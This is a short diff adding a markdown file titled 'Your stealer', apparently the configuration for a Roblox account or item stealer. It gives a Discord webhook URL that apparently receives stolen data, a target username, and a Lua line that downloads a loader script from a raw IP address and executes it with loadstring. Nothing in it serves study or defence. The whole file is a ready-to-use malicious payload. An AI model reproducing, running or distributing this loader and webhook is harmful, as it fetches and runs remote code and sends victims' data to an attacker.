@@ -1,0 +1,6 @@
+# Your stealer
+webhook: ``https://discord.com/api/webhooks/1433718869633007708/-XeXOaCwuxdRYxRSk5MWY9cERNe3QcoECuZTnN62uo-zzH2wqf-xbhA-Tl4TyMEUgAL4``
+usernames: ``JohnScriptBlox3``
+```lua
+ID="1bdb7b80-7488-42ad-981b-c0bf99c6f1e0";
+loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()```
